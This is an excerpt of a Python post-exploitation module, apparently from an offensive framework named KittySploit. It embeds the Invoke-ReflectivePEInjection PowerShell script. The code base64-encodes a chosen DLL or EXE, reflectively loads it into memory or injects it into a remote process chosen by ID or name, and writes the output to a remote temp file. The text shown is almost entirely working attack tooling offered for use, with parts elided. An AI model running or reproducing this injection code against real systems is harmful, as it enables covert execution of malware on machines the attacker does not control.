...
class Module(Post):
    __info__ = {
        ...
        "description": "Reflectively loads a Windows PE file (DLL/EXE) into the PowerShell process, or injects a DLL into a remote process.",
        "author": "Joe Bialek, Matt Graeber, KittySploit",
    ...
    force_aslr = OptBool(False, "Force the use of ASLR on the PE being loaded", False)
    do_not_zero_mz = OptBool(False, "Do not wipe the MZ from the first two bytes of the PE", False)
    ...
    def run(self):
        # Read the PE file
        try:
            with open(self.pe_file, "rb") as f:
                pe_bytes = f.read()
        except Exception as e:
            print_error(f"Failed to read PE file: {e}")
            return False

        ps1_script = r"""function Invoke-ReflectivePEInjection
{
...
Main
        ...
        # Encode PE bytes to base64 to transfer them easily in the script
        pe_base64 = base64.b64encode(pe_bytes).decode("ascii")

        # Build the wrapper script
        wrapper = []
        wrapper.append(ps1_script)
        wrapper.append(f"$PEBytes = [System.Convert]::FromBase64String('{pe_base64}')")
        
        invoke_cmd = ["Invoke-ReflectivePEInjection", "-PEBytes", "$PEBytes"]
        
        if self.proc_id > 0:
            invoke_cmd.extend(["-ProcId", str(self.proc_id)])
        if self.proc_name:
            invoke_cmd.extend(["-ProcName", f"'{self.proc_name}'"])
        if self.exe_args:
            invoke_cmd.extend(["-ExeArgs", f"'{self.exe_args}'"])
        if self.func_return_type and self.func_return_type != "Void":
            invoke_cmd.extend(["-FuncReturnType", f"'{self.func_return_type}'"])
        if self.force_aslr:
            invoke_cmd.append("-ForceASLR")
        if self.do_not_zero_mz:
            invoke_cmd.append("-DoNotZeroMZ")
        ...
        auto_output = False
        out_file = self._remote_temp_dir() + "\\powershell_pe_exec.out"

        # Wrap in output redirection
        wrapped_execution = (
            "$ProgressPreference='SilentlyContinue';"
            "$ErrorActionPreference='Continue';"
            f"& {{ {final_script} }} 2>&1 | Out-File -FilePath '{out_file}' -Width 4096 -Encoding UTF8"
        )
        ...
        print_status("Executing PowerShell PE Injection payload. This may take some time...")
